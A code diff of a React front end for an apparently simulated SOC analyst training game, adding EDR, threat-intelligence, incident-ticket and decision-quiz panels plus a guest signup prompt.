+                    {isContained&&c.state==="ESTABLISHED"?"TERMINATED":c.state}
+                  </span>
+                </div>
+              ))}
+            </div>
+          </div>
+        )}
+
+        {tab==="files"&&(
+          <div>
+            {inc.edr.file_events.map((f,i)=>(
+              <div key={i} style={{background:f.signed===false?"rgba(239,68,68,0.05)":"var(--bg2)",border:"1px solid "+(f.signed===false?"rgba(239,68,68,0.25)":"var(--bd)"),borderRadius:8,padding:"10px 14px",marginBottom:8}}>
+                <div style={{display:"flex",gap:8,alignItems:"center",marginBottom:5}}>
+                  <span style={{fontSize:10,fontWeight:700,padding:"1px 6px",borderRadius:3,background:f.action==="CREATE"?"rgba(239,68,68,0.1)":"var(--bg4)",color:f.action==="CREATE"?"#f87171":"var(--tx4)",fontFamily:"var(--mo)"}}>{f.action}</span>
+                  <span style={{fontSize:9.5,color:"var(--tx4)",fontFamily:"var(--mo)"}}>{f.time}</span>
+                  <span style={{fontSize:9.5,color:"var(--tx4)",fontFamily:"var(--mo)"}}>{f.size}</span>
+                  {!f.signed&&<span style={{fontSize:9,fontWeight:700,color:"#fca5a5",fontFamily:"var(--mo)"}}>UNSIGNED</span>}
+                </div>
+                <div style={{fontSize:11,color:f.signed===false?"#fca5a5":"var(--tx2)",fontFamily:"var(--mo)",wordBreak:"break-all",lineHeight:1.5}}>{f.path}</div>
+                {f.sha256&&<div style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)",marginTop:4}}>SHA256: {f.sha256}</div>}
+              </div>
+            ))}
+          </div>
+        )}
+
+        {tab==="contain"&&(
+          <div>
+            <div style={{background:isContained?"var(--okl)":"rgba(239,68,68,0.06)",border:"1px solid "+(isContained?"var(--okb)":"rgba(239,68,68,0.3)"),borderRadius:10,padding:"16px",marginBottom:14,textAlign:"center"}}>
+              <div style={{fontSize:28,marginBottom:6}}>{isContained?"🔒":"⚠️"}</div>
+              <div style={{fontSize:15,fontWeight:700,color:isContained?"var(--ok)":"#fca5a5",marginBottom:4}}>{isContained?"Network Containment ACTIVE":"Host NOT Contained"}</div>
+              <div style={{fontSize:12,color:"var(--tx3)"}}>{isContained?"All external traffic blocked. Sensor connected. Forensics available.":"Host is live on network. C2 sessions active."}</div>
+            </div>
+            {[["Hostname",inc.host],["Sensor ID",inc.edr.sensor_id],["Sensor Version",inc.edr.sensor_version],["Policy",inc.edr.prevention_policy],["OS","Windows 10 Enterprise 22H2"],["Last Seen","08:19:01 UTC (live)"]].map(([k,v])=>(
+              <div key={k} style={{display:"flex",justifyContent:"space-between",padding:"7px 12px",borderBottom:"1px solid var(--bd)",fontSize:12}}>
+                <span style={{color:"var(--tx4)",fontFamily:"var(--mo)"}}>{k}</span>
+                <span style={{color:"var(--tx2)",fontFamily:"var(--mo)",fontWeight:500}}>{v}</span>
+              </div>
+            ))}
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+
+function ThreatLens({inc,activeStep}){
+  const [selIdx,setSelIdx]=useState(0);
+  const stepTool=activeStep?.tool==="ThreatLens";
+  const item=inc.threatintel.lookups[selIdx];
+
+  return(
+    <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden",background:"var(--bg)"}}>
+      <div style={{background:"#0a0d18",borderBottom:"1px solid var(--bd)",padding:"0 16px",height:42,display:"flex",alignItems:"center",gap:14,flexShrink:0}}>
+        <div style={{display:"flex",alignItems:"center",gap:7}}>
+          <div style={{width:20,height:20,borderRadius:4,background:"linear-gradient(135deg,#7c3aed,#5b21b6)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:9,fontWeight:800,color:"#fff",fontFamily:"var(--mo)"}}>TL</div>
+          <span style={{fontSize:12,fontWeight:700,color:"#c4b5fd",fontFamily:"var(--mo)",letterSpacing:0.5}}>ThreatLens</span>
+          <span style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)"}}>IOC Intelligence</span>
+        </div>
+        <div style={{flex:1}}/>
+        {stepTool&&<Badge color="blue">ACTIVE TOOL</Badge>}
+      </div>
+
+      <div style={{flex:1,overflow:"auto",padding:"14px",display:"flex",gap:12}}>
+        {/* IOC selector */}
+        <div style={{width:180,flexShrink:0,display:"flex",flexDirection:"column",gap:6}}>
+          <div style={{fontSize:9,fontWeight:700,color:"var(--tx4)",fontFamily:"var(--mo)",letterSpacing:"0.1em",textTransform:"uppercase",marginBottom:4}}>IOCs from Incident</div>
+          {inc.threatintel.lookups.map((item,i)=>(
+            <div key={i} onClick={()=>setSelIdx(i)} style={{background:selIdx===i?"var(--acl)":"var(--bg2)",border:"1px solid "+(selIdx===i?"var(--acb)":"var(--bd)"),borderRadius:7,padding:"8px 10px",cursor:"pointer",transition:"all 0.13s"}}>
+              <div style={{fontSize:9,fontWeight:700,color:selIdx===i?"var(--ac)":"var(--tx4)",fontFamily:"var(--mo)",marginBottom:3,textTransform:"uppercase"}}>{item.type}</div>
+              <div style={{fontSize:10.5,color:"var(--tx2)",fontFamily:"var(--mo)",wordBreak:"break-all",lineHeight:1.4}}>{item.value}</div>
             </div>
           ))}
         </div>
-        <div className="rep-sec">
-          <div className="rep-sec-title">You fill in — Root Cause</div>
-          <div style={{fontSize:12,color:'#fff',marginBottom:10,lineHeight:1.5,fontWeight:600}}>{scene.decision.question}</div>
-          <div className="dec-opts">
-            {scene.decision.options.map((opt,i) => (
-              <div key={i} className={`dec-opt${reportChosen[0]===i?(opt.correct?' cor':' wr'):''}`}
-                onClick={()=>{ if(reportChosen[0]!==undefined) return; const newR={...reportChosen,0:i}; setReportChosen(newR); setDecisionMade(true); setChosenOpt(i); setDecisions(d=>d+1); if(opt.correct){setCorrect(c=>c+1);gainXP(scene.xp);flash('g');}else{flash('r');}; }}>
-                <div className="dec-key">{String.fromCharCode(65+i)}</div>
-                <div>
-                  {opt.text}
-                  {reportChosen[0]===i && <div className="dec-why open">{opt.why}</div>}
-                  {reportChosen[0]!==undefined && opt.correct && reportChosen[0]!==i && <div className="dec-why open">{opt.why}</div>}
-                </div>
+
+        {/* IOC detail */}
+        <div style={{flex:1,display:"flex",flexDirection:"column",gap:10,minWidth:0}}>
+          {/* verdict */}
+          <div style={{background:item.verdictColor+"15",border:"1px solid "+item.verdictColor+"40",borderRadius:9,padding:"12px 16px",display:"flex",gap:12,alignItems:"center"}}>
+            <div style={{fontSize:26}}>🔴</div>
+            <div>
+              <div style={{fontSize:14,fontWeight:700,color:item.verdictColor,marginBottom:3}}>{item.verdict}</div>
+              <div style={{display:"flex",gap:6,flexWrap:"wrap"}}>{item.categories.map(c=><Badge key={c} color="red">{c}</Badge>)}</div>
+            </div>
+          </div>
+
+          {/* scores */}
+          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8}}>
+            <div style={{background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,padding:"12px"}}>
+              <div style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:6,textTransform:"uppercase",letterSpacing:"0.1em"}}>Detection</div>
+              <div style={{fontSize:14,fontWeight:700,color:"#ef4444",fontFamily:"var(--mo)",marginBottom:2}}>{item.vt_score}</div>
+              <div style={{fontSize:10,color:"var(--tx4)"}}>VirusTotal</div>
+            </div>
+            <div style={{background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,padding:"12px"}}>
+              <div style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:6,textTransform:"uppercase",letterSpacing:"0.1em"}}>Abuse Score</div>
+              <div style={{fontSize:14,fontWeight:700,color:item.abuse_score>80?"#ef4444":item.abuse_score>50?"var(--warn)":"var(--ok)",fontFamily:"var(--mo)",marginBottom:2}}>{item.abuse_score}/100</div>
+              <div style={{fontSize:10,color:"var(--tx4)"}}>AbuseIPDB</div>
+            </div>
+          </div>
+
+          {/* metadata */}
+          <div style={{background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,overflow:"hidden"}}>
+            {[
+              item.country&&["Country / ASN",item.country+" — "+item.asn],
+              ["First Seen",item.first_seen],
+              ["Last Seen",item.last_seen],
+            ].filter(Boolean).map(([k,v])=>(
+              <div key={k} style={{display:"flex",justifyContent:"space-between",padding:"7px 12px",borderBottom:"1px solid var(--bd)",fontSize:12}}>
+                <span style={{color:"var(--tx4)",fontFamily:"var(--mo)"}}>{k}</span>
+                <span style={{color:"var(--tx2)",fontFamily:"var(--mo)"}}>{v}</span>
               </div>
             ))}
           </div>
-        </div>
-      </div>
-    );
-  };
 
-  // ── DECIDE WHEN SCENE IS "ACTIONABLE" ──────────────────────────────
-  const canAdvance = () => {
-    switch(scene.type) {
-      case 'email': return decisionMade;
-      case 'siem': return decisionMade && selectedAlert;
-      case 'edr': return decisionMade && hashResult;
-      case 'network': return decisionMade;
-      case 'quarantine': return decisionMade || quarantined.length >= 1;
-      case 'report': return decisionMade;
-      default: return true;
-    }
-  };
-
-  const siemCanDecide = scene.type==='siem' && selectedAlert && scene.data.alerts.find(a=>a.id===selectedAlert)?.key;
-
-  return (
-    <div className="g-root">
-      <div className="g-scan"/>
-      <div className="g-flash" ref={flashRef}/>
-
-      {/* HUD */}
-      <div className="g-hud">
-        <div className="g-hud-l">
-          <div className="g-brand">ANALYST</div>
-          <div className="g-inc">{scenario.incId}</div>
-        </div>
-        <div className="g-hud-r">
-          <div className="g-stat"><div className="g-stat-n">{mm}:{ss2}</div><div className="g-stat-l">Time</div></div>
-          <div className="g-stat"><div className="g-stat-n">{xp}</div><div className="g-stat-l">XP</div></div>
-          <div className="g-stat"><div className="g-stat-n">{si+1}/{scenario.scenes.length}</div><div className="g-stat-l">Step</div></div>
-        </div>
-      </div>
-
-      {/* Attacker bar */}
-      <div className="g-atk">
-        <div className="g-atk-top"><span>⚠ ATTACKER PROGRESS</span><span>{atkProg}%</span></div>
-        <div className="g-atk-track"><div className="g-atk-fill" style={{width:atkProg+'%'}}/></div>
-      </div>
-
-      {/* Scene */}
-      <div className="g-scene">
-        <div className="g-sh">
-          <div className={`g-phase ${phaseClass}`}>{scene.phase}</div>
-          <div className="g-stitle">{scene.icon} {scene.title}</div>
-          <div className="g-snum">{si+1}/{scenario.scenes.length}</div>
-        </div>
-        <div className="g-brief">
-          <div>{scene.brief}</div>
-        </div>
-        <div className="g-body">{renderSceneBody()}</div>
-
-        {/* Footer */}
-        <div className="g-foot">
-          {/* SIEM: show decision when key alert selected */}
-          {scene.type==='siem' && siemCanDecide && !decisionMade && (
-            <div className="dec-wrap">
-              <div className="dec-q">You opened the most critical alert. Risk score 97/100. What is your classification?</div>
-              <div className="dec-opts">
-                {scene.decision.options.map((opt,i) => (
-                  <div key={i} className="dec-opt" onClick={()=>chooseDecision(i)}>
-                    <div className="dec-key">{String.fromCharCode(65+i)}</div>
-                    <div>{opt.text}</div>
-                  </div>
-                ))}
+          {/* campaigns */}
+          <div style={{background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,padding:"12px 14px"}}>
+            <div style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:8,textTransform:"uppercase",letterSpacing:"0.1em"}}>Associated Campaigns</div>
+            {item.campaigns.map((c,i)=>(
+              <div key={i} style={{display:"flex",gap:8,alignItems:"flex-start",marginBottom:5}}>
+                <span style={{color:"var(--err)",fontSize:10,marginTop:2,flexShrink:0}}>▸</span>
+                <span style={{fontSize:12,color:"var(--tx2)",lineHeight:1.5}}>{c}</span>
               </div>
-            </div>
-          )}
+            ))}
+          </div>
 
-          {/* EDR: show decision when hash done */}
-          {scene.type==='edr' && hashResult && !decisionMade && (
-            <div className="dec-wrap">
-              <div className="dec-q">{scene.decision.question}</div>
-              <div className="dec-opts">
-                {scene.decision.options.map((opt,i) => (
-                  <div key={i} className="dec-opt" onClick={()=>chooseDecision(i)}>
-                    <div className="dec-key">{String.fromCharCode(65+i)}</div>
-                    <div>{opt.text}</div>
-                  </div>
-                ))}
-              </div>
+          {/* passive DNS */}
+          {item.passive_dns.length>0&&(
+            <div style={{background:"var(--bg2)",border:"1px solid var(--bd)",borderRadius:8,padding:"12px 14px"}}>
+              <div style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:8,textTransform:"uppercase",letterSpacing:"0.1em"}}>Passive DNS</div>
+              {item.passive_dns.map((d,i)=>(
+                <div key={i} style={{fontSize:11.5,color:"var(--err)",fontFamily:"var(--mo)",marginBottom:4,padding:"4px 8px",background:"var(--bg3)",borderRadius:4}}>{d}</div>
+              ))}
             </div>
-          )}
-
-          {/* Quarantine: show decision when both files quarantined */}
-          {scene.type==='quarantine' && quarantined.length >= 2 && !decisionMade && (
-            <div className="dec-wrap">
-              <div className="dec-q">{scene.decision.question}</div>
-              <div className="dec-opts">
-                {scene.decision.options.map((opt,i) => (
-                  <div key={i} className="dec-opt" onClick={()=>chooseDecision(i)}>
-                    <div className="dec-key">{String.fromCharCode(65+i)}</div>
-                    <div>{opt.text}</div>
-                  </div>
-                ))}
-              </div>
-            </div>
-          )}
-
-          {/* Feedback after decision */}
-          {decisionMade && scene.decision?.options[chosenOpt] && (
-            <div className={`g-fb ${scene.decision.options[chosenOpt].correct?'cor':'wr'}`}>
-              {scene.decision.options[chosenOpt].correct?'✓ ':'✗ '}
-              <strong>{scene.decision.options[chosenOpt].correct?'Correct. ':'Wrong. '}</strong>
-              {scene.decision.options[chosenOpt].why}
-            </div>
-          )}
-
-          {/* Next button */}
-          {canAdvance() && (
-            <button className="g-next" onClick={nextScene}>
-              {si < scenario.scenes.length-1 ? 'NEXT →' : 'CLOSE INCIDENT →'}
-            </button>
           )}
         </div>
       </div>
@@ -3684,6 +4147,611 @@ function SOCConsole({incId="INC-2026-0441",prog={xp:0,level:1,done:{}},addXP=()=
   );
 }
 
+
+function IncidentDesk({inc,activeStep,stepsDone,analyst,elapsed}){
+  const [tab,setTab]=useState("ticket");
+  const [report,setReport]=useState({exec:"",vector:"",blast:"",actions:"",pending:"",rec:""});
+  const stepTool=activeStep?.tool==="IncidentDesk";
+  const mm=String(Math.floor(elapsed/60)).padStart(2,"0");
+  const ss=String(elapsed%60).padStart(2,"0");
+  const slaLeft=Math.max(0,inc.desk.sla_minutes*60-elapsed);
+  const slaMinLeft=Math.floor(slaLeft/60);
+  const slaSec=slaLeft%60;
+  const slaOk=slaLeft>0;
+
+  return(
+    <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden",background:"var(--bg)"}}>
+      <div style={{background:"#0e1219",borderBottom:"1px solid var(--bd)",padding:"0 16px",height:42,display:"flex",alignItems:"center",gap:14,flexShrink:0}}>
+        <div style={{display:"flex",alignItems:"center",gap:7}}>
+          <div style={{width:20,height:20,borderRadius:4,background:"linear-gradient(135deg,#059669,#047857)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:9,fontWeight:800,color:"#fff",fontFamily:"var(--mo)"}}>ID</div>
+          <span style={{fontSize:12,fontWeight:700,color:"#34d399",fontFamily:"var(--mo)",letterSpacing:0.5}}>IncidentDesk</span>
+        </div>
+        <div style={{flex:1}}/>
+        <div style={{display:"flex",gap:8,alignItems:"center"}}>
+          <div style={{background:slaOk?"rgba(34,197,94,0.1)":"rgba(239,68,68,0.1)",border:"1px solid "+(slaOk?"rgba(34,197,94,0.3)":"rgba(239,68,68,0.3)"),borderRadius:5,padding:"2px 9px",fontSize:10,fontFamily:"var(--mo)",fontWeight:700,color:slaOk?"#86efac":"#fca5a5"}}>
+            SLA: {slaMinLeft}:{String(slaSec).padStart(2,"0")} {slaOk?"remaining":"BREACHED"}
+          </div>
+          {stepTool&&<Badge color="green">ACTIVE TOOL</Badge>}
+        </div>
+      </div>
+
+      <div className="tool-row" style={{background:"var(--bg2)"}}>
+        {[["ticket","Ticket"],["timeline","Audit Log"],["report","IR Report"],["escalation","Escalation"]].map(([id,label])=>(
+          <button key={id} onClick={()=>setTab(id)} className={"tool-tab"+(tab===id?" on":"")}>{label}</button>
+        ))}
+      </div>
+
+      <div style={{flex:1,overflow:"auto",padding:"14px"}}>
+
+        {tab==="ticket"&&(
+          <div style={{display:"flex",flexDirection:"column",gap:10}}>
+            <div style={{display:"flex",gap:10,alignItems:"flex-start"}}>
+              <div style={{flex:1}}>
+                <div style={{fontSize:11,fontWeight:600,color:"var(--tx4)",marginBottom:4,fontFamily:"var(--mo)"}}>TICKET ID</div>
+                <div style={{fontSize:16,fontWeight:700,color:"var(--tx)",fontFamily:"var(--mo)"}}>{inc.desk.ticket_id}</div>
+              </div>
+              <SevBadge s={inc.severity}/>
+              <Badge color={stepsDone>=inc.steps.length?"green":stepsDone>0?"amber":"red"}>
+                {stepsDone>=inc.steps.length?"CLOSED":stepsDone>0?"IN PROGRESS":"NEW"}
+              </Badge>
+            </div>
+            <div style={{fontSize:14,fontWeight:600,color:"var(--tx)",lineHeight:1.4,padding:"10px 0",borderBottom:"1px solid var(--bd)"}}>{inc.title}</div>
+
+            {[["Priority",<Badge color="red">{inc.desk.priority}</Badge>],["Category",inc.desk.category],["Subcategory",inc.desk.subcategory],["Assignee",analyst.name+" ("+analyst.id+")"],["Host",inc.host],["User",inc.user],["Created",inc.created],["SLA",inc.desk.sla_minutes+" minutes (P1)"],["Escalation",inc.desk.escalation_path]].map(([k,v])=>(
+              <div key={k} style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"6px 0",borderBottom:"1px solid var(--bd)",fontSize:12}}>
+                <span style={{color:"var(--tx4)",fontFamily:"var(--mo)",minWidth:90}}>{k}</span>
+                <span style={{color:"var(--tx2)",fontFamily:"var(--mo)",textAlign:"right",fontWeight:typeof v==="string"?400:500}}>{v}</span>
+              </div>
+            ))}
+
+            <div>
+              <div style={{fontSize:11,fontWeight:600,color:"var(--tx4)",marginBottom:6,fontFamily:"var(--mo)"}}>INCIDENT SUMMARY</div>
+              <div style={{fontSize:12.5,color:"var(--tx2)",lineHeight:1.75,background:"var(--bg3)",border:"1px solid var(--bd)",borderRadius:7,padding:"10px 12px"}}>{inc.summary}</div>
+            </div>
+
+            <div>
+              <div style={{fontSize:11,fontWeight:600,color:"var(--tx4)",marginBottom:6,fontFamily:"var(--mo)"}}>MITRE ATT&CK</div>
+              <div style={{display:"flex",gap:5,flexWrap:"wrap",marginBottom:4}}>{inc.mitre.map(t=><Badge key={t} color="blue">{t}</Badge>)}</div>
+              <div style={{fontSize:9,color:"var(--tx4)"}}>ATT&amp;CK® is a registered trademark of The MITRE Corporation. Used for educational reference only.</div>
+            </div>
+          </div>
+        )}
+
+        {tab==="timeline"&&(
+          <div>
+            <div style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:10,letterSpacing:"0.1em",textTransform:"uppercase"}}>Audit Log — Analyst Actions</div>
+            {[
+              {t:inc.created,action:"Incident created by BlueTrace SIEM correlation engine",by:"System"},
+              stepsDone>=1&&{t:tsNow(5),action:"Classified TRUE POSITIVE — Incident opened",by:analyst.name},
+              stepsDone>=2&&{t:tsNow(8),action:"Kill chain documented: Macro→PS→C2→LSASS",by:analyst.name},
+              stepsDone>=3&&{t:tsNow(12),action:"IOCs enriched: IP/Hash/Domain — all MALICIOUS",by:analyst.name},
+              stepsDone>=4&&{t:tsNow(15),action:"WS-CORP-FIN-044 Network Containment executed",by:analyst.name},
+              stepsDone>=5&&{t:tsNow(20),action:"Blast radius confirmed: 1 host, 3 email recipients",by:analyst.name},
+              stepsDone>=6&&{t:tsNow(31),action:"IR Report submitted — Incident CLOSED",by:analyst.name},
+            ].filter(Boolean).map((ev,i)=>(
+              <div key={i} style={{display:"flex",gap:10,marginBottom:8}}>
+                <div style={{width:8,height:8,borderRadius:"50%",background:"var(--ac)",flexShrink:0,marginTop:4}}/>
+                <div>
+                  <div style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:2}}>{ev.t}</div>
+                  <div style={{fontSize:12.5,color:"var(--tx2)",marginBottom:1}}>{ev.action}</div>
+                  <div style={{fontSize:10,color:"var(--ac)",fontFamily:"var(--mo)"}}>{ev.by}</div>
+                </div>
+              </div>
+            ))}
+          </div>
+        )}
+
+        {tab==="report"&&(
+          <div style={{display:"flex",flexDirection:"column",gap:12}}>
+            <div style={{background:"rgba(59,130,246,0.08)",border:"1px solid var(--acb)",borderRadius:8,padding:"10px 14px",fontSize:12,color:"var(--ac)"}}>
+              Complete the IR report below. This goes to the CISO, SOC lead, and your incident log.
+            </div>
+            {[
+              {key:"exec",label:"Executive Summary (3 sentences max for CISO)",rows:3,ph:"What happened, what was taken, what you did. Non-technical, concise."},
+              {key:"vector",label:"Attack Vector (technical)",rows:2,ph:"e.g. T1566.001 phishing email → T1059.001 PowerShell → T1071.001 C2..."},
+              {key:"blast",label:"Blast Radius",rows:2,ph:"Hosts affected, users compromised, data exposed..."},
+              {key:"actions",label:"Actions Taken",rows:3,ph:"Containment steps, IOC blocks, credential resets..."},
+              {key:"pending",label:"Pending Items",rows:2,ph:"Reimage, GPO changes, awaiting items..."},
+              {key:"rec",label:"Recommendations",rows:3,ph:"Root cause fix, policy changes, tool gaps..."},
+            ].map(f=>(
+              <div key={f.key}>
+                <label style={{fontSize:11,fontWeight:600,color:"var(--tx3)",display:"block",marginBottom:5,fontFamily:"var(--mo)"}}>{f.label}</label>
+                <textarea rows={f.rows} placeholder={f.ph} value={report[f.key]} onChange={e=>setReport(r=>({...r,[f.key]:e.target.value}))}
+                  style={{width:"100%",resize:"vertical",lineHeight:1.6,fontSize:12.5,background:"var(--bg3)",border:"1px solid var(--bd)",color:"var(--tx)",borderRadius:6,padding:"8px 10px"}}/>
+              </div>
+            ))}
+          </div>
+        )}
+
+        {tab==="escalation"&&(
+          <div>
+            <div style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:10,textTransform:"uppercase",letterSpacing:"0.1em"}}>Escalation Path</div>
+            {inc.desk.escalation_path.split(" → ").map((t,i,arr)=>(
+              <div key={i} style={{display:"flex",gap:10,alignItems:"center",marginBottom:i<arr.length-1?4:0}}>
+                <div style={{width:28,height:28,borderRadius:"50%",background:i===0?"var(--acl)":"var(--bg3)",border:"1px solid "+(i===0?"var(--ac)":"var(--bd)"),display:"flex",alignItems:"center",justifyContent:"center",fontSize:11,fontWeight:700,color:i===0?"var(--ac)":"var(--tx4)",flexShrink:0,fontFamily:"var(--mo)"}}>{i+1}</div>
+                <div style={{flex:1,background:i===0?"var(--acl)":"var(--bg2)",border:"1px solid "+(i===0?"var(--acb)":"var(--bd)"),borderRadius:6,padding:"8px 12px",fontSize:12.5,color:i===0?"var(--ac)":"var(--tx3)",fontWeight:i===0?600:400}}>{t}</div>
+              </div>
+            ))}
+            <div style={{marginTop:16,fontSize:11,color:"var(--tx4)",fontFamily:"var(--mo)"}}>Watchers: {inc.desk.watchers.join(" · ")}</div>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+
+function DecisionQuestion({step,onDecide}) {
+  const [chosen,setChosen] = useState(null);
+  const [revealed,setRevealed] = useState(false);
+  const d = step.decision;
+  if(!d) { onDecide(true); return null; }
+
+  const choose = (i) => {
+    if(chosen!==null) return;
+    setChosen(i);
+    setRevealed(true);
+    // Show explanation for 2.5 seconds then advance
+    setTimeout(() => onDecide(d.options[i]?.correct === true), 2500);
+  };
+
+  const proceed = () => onDecide(d.options[chosen]?.correct);
+
+  return (
+    <div style={{position:"fixed",inset:0,background:"rgba(17,19,24,0.65)",backdropFilter:"blur(4px)",zIndex:450,display:"flex",alignItems:"flex-end",justifyContent:"center",padding:"0 0 0 0"}}>
+      <div style={{background:"#fff",borderRadius:"16px 16px 0 0",padding:20,maxWidth:560,width:"100%",maxHeight:"85vh",overflow:"auto",boxShadow:"0 -8px 32px rgba(17,19,24,0.15)",animation:"fadeUp 0.3s ease"}}>
+        <div style={{fontSize:9,fontWeight:700,color:"#1a56db",letterSpacing:"0.15em",fontFamily:"var(--mo)",marginBottom:8,textTransform:"uppercase",display:"flex",alignItems:"center",gap:6}}>
+          <span>🤔</span> Analyst Decision Required
+        </div>
+        <div style={{fontSize:15,fontWeight:700,color:"#111318",lineHeight:1.4,marginBottom:14}}>{d.question}</div>
+
+        {/* Evidence summary before decision */}
+        {step.evidence_bullets&&!revealed&&(
+          <div style={{background:"#f7f8fa",border:"1px solid #e1e4ed",borderRadius:10,padding:"12px",marginBottom:14}}>
+            <div style={{fontSize:9,fontWeight:700,color:"#6b7280",letterSpacing:"0.1em",fontFamily:"var(--mo)",marginBottom:8,textTransform:"uppercase"}}>Evidence Summary</div>
+            {step.evidence_bullets.map((b,i)=>(
+              <div key={i} style={{display:"flex",gap:8,alignItems:"flex-start",marginBottom:4}}>
+                <span style={{color:"#1a56db",flexShrink:0,marginTop:1,fontSize:11}}>▸</span>
+                <span style={{fontSize:12.5,color:"#2d3241",lineHeight:1.5}}>{b}</span>
+              </div>
+            ))}
+          </div>
+        )}
+
+        <div style={{display:"flex",flexDirection:"column",gap:8,marginBottom:revealed?12:0}}>
+          {d.options.map((opt,i)=>{
+            const isChosen=chosen===i;
+            const isCorrect=opt.correct;
+            let bg="#f7f8fa",border="#e1e4ed",tc="#2d3241";
+            if(revealed&&isChosen&&isCorrect){bg="#f0fdf4";border="#86efac";tc="#166534";}
+            else if(revealed&&isChosen&&!isCorrect){bg="#fef2f2";border="#fca5a5";tc="#991b1b";}
+            else if(revealed&&isCorrect){bg="#f0fdf4";border="#86efac";tc="#166534";}
+            return(
+              <div key={i}>
+                <button onClick={()=>choose(i)} style={{width:"100%",background:bg,border:"1px solid "+border,borderRadius:9,padding:"11px 13px",cursor:chosen!==null?"default":"pointer",textAlign:"left",display:"flex",alignItems:"center",gap:10,transition:"all 0.15s",touchAction:"manipulation",WebkitTapHighlightColor:"transparent"}}>
+                  <div style={{width:24,height:24,borderRadius:"50%",border:"2px solid "+border,display:"flex",alignItems:"center",justifyContent:"center",fontSize:11,fontWeight:700,color:tc,flexShrink:0,background:"#fff"}}>
+                    {revealed&&isChosen?(isCorrect?"✓":"✗"):String.fromCharCode(65+i)}
+                  </div>
+                  <span style={{fontSize:13.5,color:tc,fontWeight:isChosen?600:400,lineHeight:1.35}}>{opt.text}</span>
+                </button>
+                {revealed&&isChosen&&(
+                  <div style={{margin:"5px 0 2px 0",padding:"10px 13px",background:isCorrect?"#f0fdf4":"#fef2f2",border:"1px solid "+(isCorrect?"#86efac":"#fca5a5"),borderRadius:8,fontSize:12.5,color:isCorrect?"#166534":"#991b1b",lineHeight:1.65}}>
+                    {isCorrect?"✓ ":"✗ "}{opt.why}
+                  </div>
+                )}
+              </div>
+            );
+          })}
+        </div>
+
+        {revealed&&(
+          <button onClick={proceed} style={{width:"100%",background:d.options[chosen]?.correct?"#1a56db":"#dc2626",color:"#fff",padding:"13px",borderRadius:10,fontSize:14,fontWeight:700,border:"none",cursor:"pointer",marginTop:4,animation:"fadeUp 0.3s ease"}}>
+            {d.options[chosen]?.correct?"Continue →":"Understood — Continue Anyway →"}
+          </button>
+        )}
+      </div>
+    </div>
+  );
+}
+function ModeSelector(){return null;}
+function InvestigationZero({onComplete,addXP}){return null;}
+
+function GuestSignupModal({onSignup, onContinue, nav}) {
+  return (
+    <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.85)",zIndex:999,
+      display:"flex",alignItems:"center",justifyContent:"center",padding:20}}>
+      <div style={{background:"#111827",border:"1px solid rgba(255,255,255,0.1)",
+        borderRadius:20,maxWidth:420,width:"100%",overflow:"hidden",
+        boxShadow:"0 20px 60px rgba(0,0,0,0.6)"}}>
+
+        {/* Header */}
+        <div style={{background:"linear-gradient(135deg,#1a56db,#7c3aed)",
+          padding:"24px 24px 20px",textAlign:"center"}}>
+          <div style={{fontSize:36,marginBottom:8}}>🎯</div>
+          <div style={{fontSize:20,fontWeight:800,color:"#fff",marginBottom:6}}>
+            You found the attacker.
+          </div>
+          <div style={{fontSize:13,color:"rgba(255,255,255,0.8)",lineHeight:1.5}}>
+            Passwords are being stolen from the server right now.
+            Sign up free to investigate 5 more steps and stop them.
+          </div>
+        </div>
+
+        <div style={{padding:"20px 24px"}}>
+          {/* What they get */}
+          <div style={{marginBottom:20}}>
+            {[
+              ["🔓","5 more steps — EDR, Threat Intel, Containment, Eradication, Close"],
+              ["📊","9 more free investigations after this one"],
+              ["🏆","XP, grades, and completion records"],
+              ["💾","Your progress saved — pick up where you left off"],
+            ].map(([icon,text])=>(
+              <div key={text} style={{display:"flex",gap:10,alignItems:"flex-start",
+                marginBottom:10}}>
+                <span style={{fontSize:18,flexShrink:0}}>{icon}</span>
+                <span style={{fontSize:12.5,color:"#d1d5db",lineHeight:1.5}}>{text}</span>
+              </div>
+            ))}
+          </div>
+
+          {/* FREE badge */}
+          <div style={{textAlign:"center",marginBottom:16}}>
+            <span style={{background:"rgba(34,197,94,0.15)",border:"1px solid rgba(34,197,94,0.3)",
+              color:"#4ade80",fontSize:11,fontWeight:700,padding:"4px 12px",
+              borderRadius:20,fontFamily:"var(--mo)",letterSpacing:"0.1em"}}>
+              100% FREE · NO CREDIT CARD · TAKES 30 SECONDS
+            </span>
+          </div>
+
+          {/* CTA */}
+          <button onClick={()=>nav("signup")}
+            style={{width:"100%",background:"#1a56db",border:"none",
+              borderRadius:10,padding:"14px",fontSize:15,color:"#fff",
+              cursor:"pointer",fontWeight:700,marginBottom:10,
+              boxShadow:"0 4px 20px rgba(26,86,219,0.4)"}}>
+            Create Free Account → Continue
+          </button>
+
+          <button onClick={onContinue}
+            style={{width:"100%",background:"transparent",
+              border:"1px solid rgba(255,255,255,0.1)",borderRadius:10,
+              padding:"10px",fontSize:12,color:"#6b7280",cursor:"pointer"}}>
+            Continue without saving (progress will be lost)
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
